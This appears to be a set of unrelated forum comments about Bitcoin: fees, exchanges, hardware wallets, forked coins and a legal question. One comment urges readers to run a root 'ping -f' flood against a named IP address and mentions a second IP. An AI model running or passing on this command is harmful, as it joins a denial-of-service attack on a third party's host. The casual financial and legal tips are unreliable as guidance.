eBay fees have to do with what category the item you're selling is in. I sell a lot of phones and I know it ends up being around 11.5% for eBay and PayPal fees... or at least as of last time I checked.

I couldn't imagine... They wouldn't have any way of getting an address... no QR scanner.

Cryptoimt is right.
It's simple supply and demand.
While speculation plays a part, it is the purchasing of bitcoin that drives it up.
If 10 people want 1 BTC and only 4 people are selling, those 10 will pay more for 1 BTC so they get theirs.
Conversely, if 4 people want and 10 people are selling, those 4 people will pay less.

Coinbase is a great way to begin. They make it simple and easy. Unfortunately, their fees are outrageous. 
But yes, you’re in the right place.
Once you get more btc, you’re going to want to invest in a safer way to store them. But for now (unless you’re looking to invest a bit), a hot wallet is fine for you.

I've been buying with a Chase credit card for months and they haven't cared. Not sure though, separate acct at a sep bank might be the way to go.

I'd guess 99.99% of people on here have used their bitcoin at least once.

I had been watching this video last night.
Great for anyone confused about what he means.

They’ll update the Ledger chrome app to show your B2X, just as they did with BCC. Then you’ll transfer that to an exchange to sell, because god knows no one will keep those things.

I'm going to jump on here with a little side note...
For ease of use &amp; security... Look in to a Ledger or Trezor.
Trezor has a new device coming out that looks really good.
I use a Ledger Blue currently, and they're always updating to accommodate split chain coins.
Look in to them, you won't regret it. 
And you'll find it way easier to use and understand than armory/paper wallets.

I was looking for something exactly like that app. Thank you!!

unfortunately, it's still on their homepage.

Turn on your mac, Open Terminal, sudo -s, ping -f 162.253.149.197
idk what this code in terminal is for.
it seems interesting, and like many many people should run it in the background of their computers...
I also saw this number with that exploit.im site 5.39.90.88.
Anyway, Idk what all this computer mumbo-jumbo is.
Wish I did though!

It's not a matter of if you need to.
It probably won't go any further than a lawyer sending them a notice.
Don't wait on it. Just get a lawyer involved now so they'll give you the money and you won't owe the lawyer much.
